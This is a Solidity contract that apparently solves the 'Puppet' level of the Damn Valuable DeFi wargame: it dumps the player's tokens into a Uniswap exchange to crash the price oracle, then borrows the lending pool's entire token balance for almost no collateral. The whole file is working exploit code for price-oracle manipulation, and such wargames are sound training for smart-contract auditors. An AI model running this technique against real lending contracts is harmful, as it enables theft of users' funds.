pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface UniswapExchange {
    function tokenToEthSwapInput(uint256 tokens_to_sell, uint256 min_eth, uint256 deadline) external;
}

contract AttackerPuppet {
    PuppetPool private pool;
    UniswapExchange private uniswap;
    DamnValuableToken private token;
    address private receiver;

    constructor (PuppetPool pool_, UniswapExchange uniswap_, DamnValuableToken token_, address receiver_) payable {
        pool = pool_;
        uniswap = uniswap_;
        token = token_;
        receiver = receiver_;
    }

    function attack() external payable {
        uint deadline = 2 ** 128;

        // transfer all tokens from receiver to here
        token.transferFrom(receiver, address(this), token.balanceOf(receiver));

        // swap all tokens to eth
        token.approve(address(uniswap), token.balanceOf(address(this)));
        uniswap.tokenToEthSwapInput(token.balanceOf(address(this)), 1, deadline);

        pool.borrow{value: address(this).balance}(token.balanceOf(address(pool)), receiver);
    }

    receive () external payable {}
}